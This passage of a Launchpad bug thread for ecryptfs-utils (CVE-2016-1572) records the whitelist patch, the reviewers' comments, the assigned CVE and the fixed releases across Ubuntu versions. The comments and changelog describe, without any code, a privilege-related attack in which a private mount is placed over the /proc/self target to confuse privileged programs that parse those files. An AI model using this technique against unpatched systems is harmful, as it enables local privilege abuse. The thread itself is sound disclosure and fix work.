+            <time itemprop="commentTime" datetime="2016-01-08T01:30:56.395708+00:00" title="2016-01-08 01:30:56 UTC">on 2016-01-08</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ecryptfs/+bug/1530566/comments/3"> #3</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>Colin Ian King provided some feedback in an offline email thread, showing support for the whitelist approach. I&#x27;ve tried my best to enumerate all the possible private mount destination filesystem types that we&#x27;d see under normal usage.</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">Colin Ian King provided some feedback in an offline email thread, showing support for the whitelist approach. I've tried my best to enumerate all the possible private mount destination filesystem types that we'd see under normal usage.</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ecryptfs/+bug/1530566/comments/4" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2016-01-08T01:45:42.753770+00:00" title="2016-01-08 01:45:42 UTC">on 2016-01-08</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ecryptfs/+bug/1530566/comments/4"> #4</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    <ul style="margin-bottom: 1em">
+      <li class="download-attachment">
+        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ecryptfs/+bug/1530566/+attachment/4545979/+files/private-mount-dest-fs-type-whitelist.patch">private-mount-dest-fs-type-whitelist.patch</a>
+        <a class="sprite edit action-icon" href="/ecryptfs/+bug/1530566/+attachment/4545979">Edit</a>
+        (4.1 KiB,
+        text/plain)
+      </li>
+    </ul>
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>Here&#x27;s an updated whitelist patch that adds AUFS and Squashfs to the allowed private mount destination whitelist.</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">Here's an updated whitelist patch that adds AUFS and Squashfs to the allowed private mount destination whitelist.</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ecryptfs/+bug/1530566/comments/5" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~jann-e" class="sprite person">Jann Horn (jann-e)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2016-01-08T02:00:08.661123+00:00" title="2016-01-08 02:00:08 UTC">on 2016-01-08</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ecryptfs/+bug/1530566/comments/5"> #5</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>The whitelist approach looks good to me. (I first wondered whether it would be possible to first mount a FUSE filesystem over /proc/$pid, then mount an ecryptfs over that, but that wouldn&#x27;t work because unprivileged FUSE wouldn&#x27;t allow the chdir() to the filesystem root.)</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">The whitelist approach looks good to me. (I first wondered whether it would be possible to first mount a FUSE filesystem over /proc/$pid, then mount an ecryptfs over that, but that wouldn't work because unprivileged FUSE wouldn't allow the chdir() to the filesystem root.)</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ecryptfs/+bug/1530566/comments/6" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2016-01-12T12:16:39.830155+00:00" title="2016-01-12 12:16:39 UTC">on 2016-01-12</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ecryptfs/+bug/1530566/comments/6"> #6</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>This is CVE-2016-1572</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">This is CVE-2016-1572</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+
+          
+              <div class="boardComment">
+  <div class="boardCommentDetails">
+    
+      <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
+    
+    <time title="2016-01-20 15:04:26 UTC" datetime="2016-01-20T15:04:26.401628+00:00">on 2016-01-20</time>
+  </div>
+  <div class="boardCommentActivity">
+    <table class="bug-activity">
+  
+    
+      
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>information type</b>:
+      </td>
+      <td>
+        Private Security &#8594; Public Security
+      </td>
+    </tr>
+  
+</table>
+  </div>
+</div>
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ecryptfs/+bug/1530566/comments/7" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~crichton" class="sprite person">Ubuntu Foundations Team Bug Bot (crichton)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2016-01-20T16:25:05.856166+00:00" title="2016-01-20 16:25:05 UTC">on 2016-01-20</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ecryptfs/+bug/1530566/comments/7"> #7</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>The attachment &quot;private-<wbr />mount-dest-<wbr />fs-type-<wbr />whitelist.<wbr />patch&quot; seems to be a debdiff.  The ubuntu-sponsors team has been subscribed to the bug report so that they can review and hopefully sponsor the debdiff.  If the attachment isn&#x27;t a patch, please remove the &quot;patch&quot; flag from the attachment, remove the &quot;patch&quot; tag, and if you are member of the ~ubuntu-sponsors, unsubscribe the team.</p>
+<p>[This is an automated message performed by a Launchpad user owned by ~brian-murray, for any issue please contact him.]</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">The attachment "private-mount-dest-fs-type-whitelist.patch" seems to be a debdiff.  The ubuntu-sponsors team has been subscribed to the bug report so that they can review and hopefully sponsor the debdiff.  If the attachment isn't a patch, please remove the "patch" flag from the attachment, remove the "patch" tag, and if you are member of the ~ubuntu-sponsors, unsubscribe the team.
+
+[This is an automated message performed by a Launchpad user owned by ~brian-murray, for any issue please contact him.]</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  <div class="boardCommentActivity">
+    
+      <table class="bug-activity">
+  
+    
+      
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>tags</b>:
+      </td>
+      <td>
+        added: patch
+      </td>
+    </tr>
+  
+</table>
+    
+    
+  </div>
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+
+          
+              <div class="boardComment">
+  <div class="boardCommentDetails">
+    
+      <a href="https://launchpad.net/~mhodson" class="sprite person">Mathew Hodson (mhodson)</a>
+    
+    <time title="2016-01-21 01:09:20 UTC" datetime="2016-01-21T01:09:20.554733+00:00">on 2016-01-21</time>
+  </div>
+  <div class="boardCommentActivity">
+    <table class="bug-activity">
+  
+    
+      <tr>
+        <td colspan="2">Changed in ecryptfs-utils (Ubuntu Precise): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>importance</b>:
+      </td>
+      <td>
+        Undecided &#8594; High
+      </td>
+    </tr>
+  
+  
+    
+      <tr>
+        <td colspan="2">Changed in ecryptfs-utils (Ubuntu Trusty): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>importance</b>:
+      </td>
+      <td>
+        Undecided &#8594; High
+      </td>
+    </tr>
+  
+  
+    
+      <tr>
+        <td colspan="2">Changed in ecryptfs-utils (Ubuntu Vivid): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>importance</b>:
+      </td>
+      <td>
+        Undecided &#8594; High
+      </td>
+    </tr>
+  
+  
+    
+      <tr>
+        <td colspan="2">Changed in ecryptfs-utils (Ubuntu Wily): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>importance</b>:
+      </td>
+      <td>
+        Undecided &#8594; High
+      </td>
+    </tr>
+  
+  
+    
+      <tr>
+        <td colspan="2">Changed in ecryptfs-utils (Ubuntu Xenial): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>importance</b>:
+      </td>
+      <td>
+        Undecided &#8594; High
+      </td>
+    </tr>
+  
+</table>
+  </div>
+</div>
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ecryptfs/+bug/1530566/comments/8" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2016-01-21T01:21:16.484664+00:00" title="2016-01-21 01:21:16 UTC">on 2016-01-21</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ecryptfs/+bug/1530566/comments/8"> #8</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>I forgot to put this bug number in the changelog when I uploaded fixes for this issue earlier today. See <a rel="nofollow" href="http://www.ubuntu.com/usn/usn-2876-1/">http://<wbr />www.ubuntu.<wbr />com/usn/<wbr />usn-2876-<wbr />1/</a> for details such as the package versions containing fixes for the various Ubuntu releases.</p>
+<p>As for the current Ubuntu development release (Xenial), Dustin Kirkland will be cutting a new upstream ecryptfs-utils release soon, which will include the fix, and then upload that release to Xenial.</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">I forgot to put this bug number in the changelog when I uploaded fixes for this issue earlier today. See http://www.ubuntu.com/usn/usn-2876-1/ for details such as the package versions containing fixes for the various Ubuntu releases.
+
+As for the current Ubuntu development release (Xenial), Dustin Kirkland will be cutting a new upstream ecryptfs-utils release soon, which will include the fix, and then upload that release to Xenial.</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  <div class="boardCommentActivity">
+    
+      <table class="bug-activity">
+  
+    
+      <tr>
+        <td colspan="2">Changed in ecryptfs-utils (Ubuntu Precise): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>status</b>:
+      </td>
+      <td>
+        New &#8594; Fix Released
+      </td>
+    </tr>
+  
+  
+    
+      <tr>
+        <td colspan="2">Changed in ecryptfs-utils (Ubuntu Trusty): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>status</b>:
+      </td>
+      <td>
+        New &#8594; Fix Released
+      </td>
+    </tr>
+  
+  
+    
+      <tr>
+        <td colspan="2">Changed in ecryptfs-utils (Ubuntu Vivid): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>status</b>:
+      </td>
+      <td>
+        New &#8594; Fix Released
+      </td>
+    </tr>
+  
+  
+    
+      <tr>
+        <td colspan="2">Changed in ecryptfs-utils (Ubuntu Wily): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>status</b>:
+      </td>
+      <td>
+        New &#8594; Fix Released
+      </td>
+    </tr>
+  
+  
+    
+      <tr>
+        <td colspan="2">Changed in ecryptfs-utils (Ubuntu Xenial): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>status</b>:
+      </td>
+      <td>
+        New &#8594; Triaged
+      </td>
+    </tr>
+    <tr>
+      <td style="text-align: right;">
+        <b>assignee</b>:
+      </td>
+      <td>
+        nobody &#8594; Dustin Kirkland  (kirkland)
+      </td>
+    </tr>
+  
+  
+    
+      <tr>
+        <td colspan="2">Changed in ecryptfs-utils (Ubuntu Wily): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>assignee</b>:
+      </td>
+      <td>
+        nobody &#8594; Tyler Hicks (tyhicks)
+      </td>
+    </tr>
+  
+  
+    
+      <tr>
+        <td colspan="2">Changed in ecryptfs-utils (Ubuntu Vivid): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>assignee</b>:
+      </td>
+      <td>
+        nobody &#8594; Tyler Hicks (tyhicks)
+      </td>
+    </tr>
+  
+  
+    
+      <tr>
+        <td colspan="2">Changed in ecryptfs-utils (Ubuntu Trusty): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>assignee</b>:
+      </td>
+      <td>
+        nobody &#8594; Tyler Hicks (tyhicks)
+      </td>
+    </tr>
+  
+  
+    
+      <tr>
+        <td colspan="2">Changed in ecryptfs-utils (Ubuntu Precise): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>assignee</b>:
+      </td>
+      <td>
+        nobody &#8594; Tyler Hicks (tyhicks)
+      </td>
+    </tr>
+  
+  
+    
+      <tr>
+        <td colspan="2">Changed in ecryptfs: </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>assignee</b>:
+      </td>
+      <td>
+        nobody &#8594; Tyler Hicks (tyhicks)
+      </td>
+    </tr>
+    <tr>
+      <td style="text-align: right;">
+        <b>status</b>:
+      </td>
+      <td>
+        New &#8594; Fix Committed
+      </td>
+    </tr>
+  
+</table>
+    
+    
+  </div>
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ecryptfs/+bug/1530566/comments/9" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2016-01-21T01:23:00.316996+00:00" title="2016-01-21 01:23:00 UTC">on 2016-01-21</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ecryptfs/+bug/1530566/comments/9"> #9</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>The upstream fix was committed as revision 870:</p>
+<p>&nbsp;&nbsp;<a rel="nofollow" href="https://bazaar.launchpad.net/~ecryptfs/ecryptfs/trunk/revision/870">https:/<wbr />/bazaar.<wbr />launchpad.<wbr />net/~ecryptfs/<wbr />ecryptfs/<wbr />trunk/revision/<wbr />870</a></p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">The upstream fix was committed as revision 870:
+
+  https://bazaar.launchpad.net/~ecryptfs/ecryptfs/trunk/revision/870</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ecryptfs/+bug/1530566/comments/10" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2016-01-22T18:30:21.808066+00:00" title="2016-01-22 18:30:21 UTC">on 2016-01-22</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ecryptfs/+bug/1530566/comments/10"> #10</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package ecryptfs-utils - 109-0ubuntu1</p>
+<p>---------------<br />
+ecryptfs-utils (109-0ubuntu1) xenial; urgency=medium</p>
+<p>&nbsp;&nbsp;[ Maikel ]<br />
+&nbsp;&nbsp;* doc/manpage/<wbr />ecryptfs-<wbr />migrate-<wbr />home.8: Fix typos in man page (LP: <a href="/bugs/1518787" class="bug-link">#1518787</a>)</p>
+<p>&nbsp;&nbsp;[ Kylie McClain ]<br />
+&nbsp;&nbsp;* src/utils/<wbr />mount.ecryptfs.<wbr />c, src/utils/<wbr />mount.ecryptfs_<wbr />private.<wbr />c: Fix build<br />
+&nbsp;&nbsp;&nbsp;&nbsp;issues on musl libc (LP: <a href="/bugs/1514625" class="bug-link">#1514625</a>)</p>
+<p>&nbsp;&nbsp;[ Colin Ian King ]<br />
+&nbsp;&nbsp;* src/daemon/main.c:<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- Static analysis with Clang&#x27;s scan-build shows that we can potentially<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;overflow the input buffer if the input is equal or more than the buffer<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;size.  Need to guard against this by:<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1. Only reading in input_size - 1  chars<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2. Checking earlier on to see if input_size is value to insure that we<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;read in at least 1 char</p>
+<p>&nbsp;&nbsp;[ Tyler Hicks ]<br />
+&nbsp;&nbsp;* src/utils/<wbr />mount.ecryptfs_<wbr />private.<wbr />c:<br />
+&nbsp;&nbsp;&nbsp;&nbsp;- Refuse to mount over non-standard filesystems. Mounting over<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;certain types filesystems is a red flag that the user is doing<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;something devious, such as mounting over the /proc/self symlink<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;target with malicious content in order to confuse programs that may<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;attempt to parse those files. (LP: <a href="/bugs/1530566" class="bug-link">#1530566</a>)</p>
+<p>&nbsp;&nbsp;[ Dustin Kirkland ]<br />
+&nbsp;&nbsp;* xenial</p>
+<p>&nbsp;-- Dustin Kirkland &lt;email address hidden&gt;  Fri, 22 Jan 2016 10:05:35 -0600</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">This bug was fixed in the package ecryptfs-utils - 109-0ubuntu1
+
+---------------
+ecryptfs-utils (109-0ubuntu1) xenial; urgency=medium
+
+  [ Maikel ]
+  * doc/manpage/ecryptfs-migrate-home.8: Fix typos in man page (LP: #1518787)
+
+  [ Kylie McClain ]
+  * src/utils/mount.ecryptfs.c, src/utils/mount.ecryptfs_private.c: Fix build
+    issues on musl libc (LP: #1514625)
+
+  [ Colin Ian King ]
+  * src/daemon/main.c:
+    - Static analysis with Clang's scan-build shows that we can potentially
+      overflow the input buffer if the input is equal or more than the buffer
+      size.  Need to guard against this by:
+      1. Only reading in input_size - 1  chars
+      2. Checking earlier on to see if input_size is value to insure that we
+         read in at least 1 char
+
+  [ Tyler Hicks ]
+  * src/utils/mount.ecryptfs_private.c:
+    - Refuse to mount over non-standard filesystems. Mounting over
+      certain types filesystems is a red flag that the user is doing
+      something devious, such as mounting over the /proc/self symlink
+      target with malicious content in order to confuse programs that may
+      attempt to parse those files. (LP: #1530566)
+
+  [ Dustin Kirkland ]
+  * xenial
+
+ -- Dustin Kirkland &lt;kirkland@ubuntu.com&gt;  Fri, 22 Jan 2016 10:05:35 -0600</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  <div class="boardCommentActivity">
+    
+      <table class="bug-activity">
+  
+    
+      <tr>
+        <td colspan="2">Changed in ecryptfs-utils (Ubuntu Xenial): </td>
+      </tr>
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>status</b>:
+      </td>
+      <td>
+        Triaged &#8594; Fix Released
+      </td>
+    </tr>
+  
+</table>
+    
+    
+  </div>
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        <div style="float: right;">
+          <a class="menu-link-activitylog" href="https://bugs.launchpad.net/ecryptfs/+bug/1530566/+activity">See full activity log</a>
+        </div>
+        <div class="clearfix"></div>
+
+        
+          
+
+          
+            <div align="center" id="add-comment-login-first">
+              To post a comment you must <a href="+login?comments=all">log in</a>.
+            </div>
+          
+        
+        
+      
+
+      </div><!-- class="top-portlet" -->
+      </div><!--- id="maincontentsub"-->
+      <div>
+        <div id="duplicate-form-container"></div>
+        <div id="privacy-form-container"></div>
+      </div>
+    </div>
+            
+            
+          </div><!-- yui-b -->
+        </div><!-- yui-main -->
+
+        
+          <div id="side-portlets" class="yui-b side">
+            
+      <div id="involvement" class="portlet">
+        <ul class="involvement">
+          <li class="single">
+            <a class="sprite bugs" href="/ecryptfs/+filebug">
+              Report a bug
+            </a>
+          </li>
+        </ul>
+      </div>
+      <div id="privacy" class="first portlet public">
+  <div id="privacy-text">
+     <span id="information-type-summary" class="sprite public">This report contains
+         <strong id="information-type">Public Security</strong>
+         information
+     </span>&nbsp;<a class="sprite edit action-icon" id="privacy-link" href="/ecryptfs/+bug/1530566/+secrecy">Edit</a>
+
+     <div id="information-type-description" style="padding-top: 5px">Everyone can see this security related information.
+</div>
+  </div>
+</div>
+
+      <div id="portlet-actions" class="portlet vertical">
+  <ul id="duplicate-actions">
+    <li class="sprite bug-dupe">
+    <span id="mark-duplicate-text">
+    <a class="menu-link-mark-dupe" href="/ecryptfs/+bug/1530566/+duplicate">Mark as duplicate</a>
+    </span>
+    </li>
+    
+    <li><a class="menu-link-createquestion sprite add" href="https://bugs.launchpad.net/ecryptfs/+bug/1530566/+create-question">Convert to a question</a></li>
+    
+    <li><a class="menu-link-addbranch sprite add" href="https://bugs.launchpad.net/ecryptfs/+bug/1530566/+addbranch">Link a related branch</a></li>
+    <li><a class="menu-link-linktocve sprite add" href="https://bugs.launchpad.net/ecryptfs/+bug/1530566/+linkcve">Link to <abbr title="Common Vulnerabilities and Exposures Index">CVE</abbr></a></li>
